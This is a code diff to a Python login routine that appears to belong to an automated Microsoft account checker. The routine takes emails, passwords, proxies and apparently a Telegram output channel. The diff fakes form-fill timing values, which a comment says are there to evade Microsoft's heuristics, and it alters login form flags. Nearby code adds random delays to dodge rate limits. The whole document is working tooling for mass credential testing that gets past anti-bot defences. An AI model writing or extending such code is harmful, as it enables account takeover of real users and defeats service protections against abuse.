@@ -283,16 +283,22 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
     emit_event(q, "step_start", {"step": 3, "name": "Login"})
     import random as _r; time.sleep(_r.uniform(0.8, 2.2))  # anti-rate-limit delay aleatorio
 
+    # Tiempos simulados (milisegundos) para evadir heurísticas de MS
+    import time
+    t_start = int(time.time() * 1000) - _r.randint(15000, 35000) # Tiempo de carga simulado hace 15-35s
+    t_submit = int(time.time() * 1000)
+    duracion_llenado = t_submit - t_start
+
     post_data = {
-        "i13": "1", "login": email, "loginfmt": email, "type": "11",
-        "LoginOptions": "1", "lrt": "", "lrtPartition": "",
+        "i13": "0", "login": email, "loginfmt": email, "type": "11",
+        "LoginOptions": "3", "lrt": "", "lrtPartition": "",
         "hisRegion": "", "hisScaleUnit": "", "passwd": password,
         "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
         "canary": "", "ctx": "", "hpgrequestid": "",
         "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "FoundMSAs": "",
         "fspost": "0", "i21": "0", "CookieDisclosure": "0",
-        "IsFidoSupported": "0", "isSignupPost": "0",
-        "isRecoveryAttemptPost": "0", "i19": "3772"
+        "IsFidoSupported": "1", "isSignupPost": "0",
+        "isRecoveryAttemptPost": "0", "i19": str(duracion_llenado)
     }
 
     session.headers.pop("Host", None)
